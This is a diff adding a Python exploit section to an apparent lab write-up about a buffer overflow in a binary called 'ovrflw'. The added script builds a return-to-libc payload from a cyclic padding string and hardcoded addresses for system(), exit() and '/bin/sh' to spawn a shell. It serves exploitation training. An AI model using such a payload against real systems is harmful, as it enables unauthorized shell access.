@@ -17,3 +17,21 @@ Upon the generation of a `segmentation fault`being thrown by the overflw program
 
 ```gdb ./ovrflw```
 
+
+###Python Exploit Code
+```#!/usr/bin/python
+
+import struct
+from subprocess import *
+
+system_mem = struct.pack("<I", 0xb7646310)
+binsh_mem = struct.pack("<I", 0xb7768bac)
+exit_mem = struct.pack("<I", 0xb7639260)
+
+payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab"
+payload += system_mem
+payload += exit_mem
+payload += binsh_mem
+
+print(payload)```
+
